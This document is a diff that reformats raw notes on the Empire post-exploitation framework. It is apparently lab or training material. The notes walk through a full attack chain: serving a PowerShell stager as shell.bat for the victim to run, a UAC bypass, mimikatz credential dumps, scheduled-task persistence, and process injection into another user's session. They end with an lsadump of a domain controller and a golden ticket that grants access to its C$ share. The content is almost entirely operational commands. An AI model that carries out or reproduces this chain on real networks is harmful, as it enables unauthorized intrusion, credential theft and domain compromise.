@@ -3,59 +3,59 @@ Empire (raw notes, need polished)
 
 cd /opt/Empire
 ./empire
-help						# Show main help menu.
-listeners					# Change to the listener menu.
-help						# Show listener commands.
-uselistener <tab 2x>				# Show the different types of listeners.
-uselistener http				# Select a listener.
-info						# Show info about the listener.
+help                                  Show main help menu
+listeners                             Change to the listener menu
+help                                  Show listener commands
+uselistener <tab 2x>                  Show the different types of listeners
+uselistener http                      Select a listener
+info                                  Show info about the listener
 set Port 4443
-execute						# Execute the listener.
-back						# You should see a new active listener.
+execute                               Execute the listener
+back                                  You should see a new active listener
 
-launcher					# Show the format.
-launcher powershell  http			# Creates a PowerShell one-liner. 
+launcher                              Show the format
+launcher powershell  http             Creates a PowerShell one-liner
 Copy all of the code.
 Open a new Terminal.
 cd /var/www/html
-vim shell.bat					# Paste in the code.
+vim shell.bat                         Paste in the code
 service apache2 start
 
--Windows
+- Windows
 Open a web browser to Kali IP/shell.bat
 Copy all of the code.
 Open a Command Prompt, paste in the code, and press enter.
 
--Kali
+- Kali
 In a few seconds, you will see the initial agent response.
-main						# You should see 1 listener and 1 agent.
-agents						# Show active agents.
-rename <original name> <new name>		# Rename agent to something user friendly.
-rename <original name> initial			# Rename agent to something user friendly.
-interact initial				# Interact with the agent using new name.
+main                                  You should see 1 listener and 1 agent
+agents                                Show active agents
+rename <original name> <new name>     Rename agent to something user friendly
+rename <original name> initial        Rename agent to something user friendly
+interact initial                      Interact with the agent using new name
 
-usemodule powershell/privesc/bypassuac		# Select a module.
-info						# Show info about the module.
-run						# Default time is 5 sec.
+usemodule powershell/privesc/bypassuac   Select a module
+info                                  Show info about the module
+run                                   Default time is 5 sec
 
-info						# Look for high_integrity 0. This means we are not admin yet.
+info                                  Look for high_integrity 0, this means we are not admin yet
 
 usemodule powershell/privesc/powerup/allchecks
 info
-set Agent http					# Use the listeners name
+set Agent http                        Use the listeners name
 run.
 You should see a new listener.
 back
-list						# One of the agents under Username 
+list                                  One of the agents under Username 
 should have an asterisk. This means power 
 user.
 rename <name> <name2>
 interact <name2>
-Info						# Look for high_integrity 1. 
+Info                                  Look for high_integrity 1
 This means we are admin yet.
-creds						# Show cleartext passwords (empty).
-mimikatz					# Wait a few.
-creds						# Show cleartext passwords.
+creds                                 Show cleartext passwords (empty)
+mimikatz                              Wait a few
+creds                                 Show cleartext passwords
 
 usemodule persistence/elevated/schtasks
 info
@@ -66,7 +66,7 @@ y
 ========================================================================
 
 sysinfo
-shell Get-Process				# Show running processes.
+shell Get-Process                     Show running processes
 shell ipconfig
 shell whoami
 
@@ -79,11 +79,11 @@ info
 execute
 ========================================================================
 
-kill <name>					# Kill agent.
+kill <name>	                           Kill agent
 
-usestager <tab 2x>				# Show the different types of stagers.
-usestager windows/launcher_bat			# Select a stager.
-info						# Show info about the stager.
+usestager <tab 2x>                    Show the different types of stagers
+usestager windows/launcher_bat        Select a stager
+info                                  Show info about the stager
 
 usemodule powershell/privesc/powerup/allchecks
 info
@@ -93,17 +93,17 @@ execute
 back
 bypassuac initial
 y
-agents						# Look for the *, which means a high integrity agent.
-interact <name*>				# Use name for the high integrity agent.
+agents                                Look for the *, which means a high integrity agent
+interact <name*>                      Use name for the high integrity agent
 rename PhishedHigh
-ps						# See who else is on the box.
-psinject initial <PID> 	# PID of other user's process.
+ps                                    See who else is on the box
+psinject initial <PID>                PID of other user's process
 info
 execute
 
 agents
 list
-interact <name**>				# Use name for the second user.	
+interact <name**>                     Use name for the second user
 usemodule situational_awareness/network/find_localadmin_access
 info
 execute
@@ -116,7 +116,7 @@ set Listener initial
 execute
 
 agents
-interact <name***>				# Use name for the second user with the high integrity agent.
+interact <name***>                    Use name for the second user with the high integrity agent.
 rename DC
 usemodule credentials/mimikatz/lsadump
 info
@@ -125,7 +125,7 @@ execute
 creds
 agents
 interact PhishedUser
-dir \\PRIMARY\C$				# Access denied
+dir \\PRIMARY\C$                      Access denied
 usemodule credentials/mimikatz/golden_ticket
 info
 set CredID 1
@@ -133,7 +133,7 @@ set user Administrator
 execute
 
 back
-dir \\PRIMARY\C$				# Access granted
+dir \\PRIMARY\C$                      Access granted
 =========================================================
 
 Example 2
@@ -219,4 +219,3 @@ wmic /?
 switch-name /?
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
-
